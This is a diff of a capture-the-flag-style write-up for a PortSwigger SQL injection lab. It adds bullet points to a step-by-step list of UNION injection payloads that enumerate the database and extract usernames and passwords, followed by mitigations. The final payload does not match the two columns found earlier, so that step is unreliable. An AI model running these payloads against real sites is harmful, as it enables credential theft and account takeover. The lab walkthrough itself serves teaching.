@@ -8,52 +8,52 @@
 **Lab link** → https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
 
 *Navigate to*
-/filter?category=Gifts
+* /filter?category=Gifts
 
 *Confirm injection point*
-category=Gifts'
+* category=Gifts'
     → Internal server error confirms SQL injection
 
 *Bypass query*
-category=Gifts'--
+* category=Gifts'--
     → Query executes successfully
 
 *Determine number of columns*
-category=Gifts' ORDER BY 2--
+* category=Gifts' ORDER BY 2--
     → Success
 
-category=Gifts' ORDER BY 3--
+* category=Gifts' ORDER BY 3--
     → Error → Confirms 2 columns
 
 *Confirm database type*
-category=Gifts' UNION SELECT NULL, version()--
+* category=Gifts' UNION SELECT NULL, version()--
     → Displays PostgreSQL version
 
 *Extract table names*
-category=Gifts' UNION SELECT NULL, table_name FROM information_schema.tables--
+* category=Gifts' UNION SELECT NULL, table_name FROM information_schema.tables--
 
 *Extract column names*
-category=Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
+* category=Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
 
 *Extract credentials*
-category=Gifts' UNION SELECT (username || ' = ' || password) FROM users--
+* category=Gifts' UNION SELECT (username || ' = ' || password) FROM users--
 
 *Use credentials*
-Username: administrator
-Password: extracted value
+* Username: administrator
+* Password: extracted value
     → Login successful → Lab Solved
 
 # Payload Used
-' UNION SELECT (username || ' = ' || password) FROM users--
+* ' UNION SELECT (username || ' = ' || password) FROM users--
 
 # Impact
-An attacker can extract sensitive data such as usernames and passwords, leading to full account takeover, including administrative access.
+* An attacker can extract sensitive data such as usernames and passwords, leading to full account takeover, including administrative access.
 
 # Tools Used
-Browser
-Burp Suite (Proxy, Repeater)
+* Browser
+* Burp Suite (Proxy, Repeater)
 
 # Mitigation
-Use parameterized queries
-Implement input validation
-Restrict database error output
+* Use parameterized queries
+* Implement input validation
+* Restrict database error output
